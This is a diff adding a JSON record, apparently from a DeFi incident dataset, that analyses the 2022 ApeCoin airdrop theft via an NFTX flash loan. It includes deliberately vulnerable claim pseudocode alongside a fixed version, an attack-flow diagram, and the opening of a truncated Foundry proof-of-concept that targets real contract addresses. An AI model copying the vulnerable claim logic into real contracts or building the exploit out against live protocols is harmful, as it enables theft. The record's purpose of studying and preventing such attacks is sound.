@@ -1,0 +1,34 @@
+{
+ "id": "2022__2022-03-17_BAYC_ApeCoinAirdropFlashLoan",
+ "source_file": "2022/2022-03-17_BAYC_ApeCoinAirdropFlashLoan.md",
+ "title": "BAYC ApeCoin — NFTX Flash Loan Airdrop Theft Analysis",
+ "date": "2022-03-17",
+ "protocol": "ApeCoin",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "60,564 APE airdrop stolen (legitimate holders' allocation)",
+ "loss_usd": null,
+ "root_cause": "ApeCoin airdrop claim eligibility was based on NFT ownership at transaction execution time with no prior snapshot, allowing a single-transaction attack that flash-borrowed NFTs from the NFTX vault, claimed the airdrop, then returned them",
+ "attack_tx": "Block 14,403,948",
+ "vulnerable_contract": "NFTX Vault 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable ApeCoin airdrop claim logic (pseudocode)\ncontract ApeCoindAirdrop {\n    mapping(uint256 => bool) public claimed; // Claim status per NFT ID\n    IERC721 BAYC;\n    IERC20 APE;\n\n    //",
+  "❌ Eligibility based on NFT ownership at claim time\n    // No snapshot block validation\n    function claimTokens(uint256[] calldata tokenIds) external {\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            uint256 tokenId = tokenIds[i];\n            //",
+  "❌ Checks current owner — can be temporarily held via flash loan\n            require(BAYC.ownerOf(tokenId) == msg.sender, \"not owner\");\n            require(!claimed[tokenId], \"already claimed\");\n\n            claimed[tokenId] = true;\n            APE.transfer(msg.sender, 10_094 * 1e18); // Airdrop amount per BAYC\n        }\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern (snapshot-based)\ncontract ApeCoindAirdropFixed {\n    uint256 public snapshotBlock; // Reference block for airdrop\n\n    function claimTokens(uint256[] calldata tokenIds) external {\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            uint256 tokenId = tokenIds[i];\n            //",
+  "✅ Checks owner at snapshot block\n            address ownerAtSnapshot = getOwnerAtBlock(tokenId, snapshotBlock);\n            require(ownerAtSnapshot == msg.sender, \"not owner at snapshot\");\n            require(!claimed[tokenId], \"already claimed\");\n\n            claimed[tokenId] = true;\n            APE.transfer(msg.sender, 10_094 * 1e18);\n        }\n    }\n}"
+ ],
+ "steps": [
+  "5.2 tokens → receive 5 BAYC NFTs",
+  "Current ownership check → passes",
+  "5 NFTs → 5 NFTX tokens"
+ ],
+ "other_code": [
+  "Attacker Contract (implements onERC721Received)\n    │\n    ├─[1] Transfer owned BAYC NFT to attacker contract\n    │       (PoC uses a BAYC #xxx already held)\n    │\n    ├─[2] Call NFTX.flashLoan(5.2 BAYC tokens)\n    │       Borrow 5.2 BAYC tokens from NFTX vault\n    │\n    ├─[3] [Inside flashLoan callback]\n    │       │\n    │       ├─ Redeem 5 BAYC NFTs using vault tokens\n    │       │       5.2 tokens → receive 5 BAYC NFTs\n    │       │\n    │       ├─ ApeCoindAirdrop.claimTokens([BAYC #ids])\n    │       │       Current ownership check → passes\n    │       │       60,564 APE claimed successfully\n    │       │\n    │       ├─ Mint 5 BAYC NFTs back into NFTX (mint)\n    │       │       5 NFTs → 5 NFTX tokens\n    │       │\n    │       └─ Repay remaining 0.2 tokens\n    │\n    └─[4] 60,564 APE theft ",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface INFTXVault {\n    // ⚡ Flash loan: borrow BAYC vault tokens\n    function flashLoan(\n        address receiver,\n        address token,\n        uint256 amount,\n        bytes calldata data\n    ) external returns (bool);\n\n    // Vault tokens → redeem BAYC NFTs\n    function redeem(uint256 amount, uint256[] calldata specificIds) external;\n\n    // BAYC NFTs → mint vault tokens\n    function mint(uint256[] calldata tokenIds, uint256[] calldata amounts) external;\n}\n\ninterface IAirdrop {\n    function claimTokens(uint256[] calldata tokenIds) external;\n}\n\ncontract ContractTest is Test {\n    IERC721 BAYC     = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);\n    INFTXVault nftx  = INFTXVault(0xEA47B"
+ ]
+}
